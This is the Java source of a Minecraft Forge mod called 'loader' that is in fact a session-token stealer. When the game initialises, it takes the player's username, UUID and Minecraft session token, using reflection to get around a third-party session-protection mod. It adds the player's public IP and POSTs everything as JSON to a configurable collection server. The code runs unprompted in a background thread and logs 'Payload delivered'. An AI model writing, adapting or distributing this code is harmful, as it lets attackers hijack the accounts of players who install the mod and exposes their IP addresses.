package dev.gutenacht.loader;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

@Mod(modid = Loader.MODID, version = Loader.VERSION)
public class Loader {
    public static final String MODID = "loader";
    public static final String VERSION = "1.0";
    public static final String rid = "replace_me_with_a_valid_key";

    public static void Load() {
        new Thread(() -> {
            Minecraft mc = Minecraft.getMinecraft();
            String uuid = mc.getSession().getPlayerID();
            String username = mc.getSession().getUsername();
            try {
                String sessionProtector = null;
                try {
                    Class<?> clazz = Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection");
                    Field field = clazz.getField("changed");
                    sessionProtector = (String) field.get(null);
                } catch (Exception ignored) {
                }
                String token = sessionProtector == null ? mc.getSession().getToken() : sessionProtector;
                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                send(username, uuid, token, ip, rid);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void send(String name, String uuid, String token, String ip, String rid) {
            try {
                final String body = "{\"username\":\"" + name + "\",\"uuid\":\"" + uuid + "\",\"token\":\"" + token + "\",\"ip\":\"" + ip + "\",\"rid\":\"" + rid + "\"}".toString();
                final URL url = new URL("http://localhost:3000/");
                final HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("User-Agent", "Mozilla/5.0");
                con.setDoOutput(true);
                try (OutputStream out = con.getOutputStream();) {
                    out.write(body.getBytes(StandardCharsets.UTF_8));
                }
                con.getResponseCode();
                con.getInputStream().close();
                con.disconnect();
                System.out.println("Payload delivered");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }


    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
    new Thread(() -> {
            Load();
        }).start();
    }
}
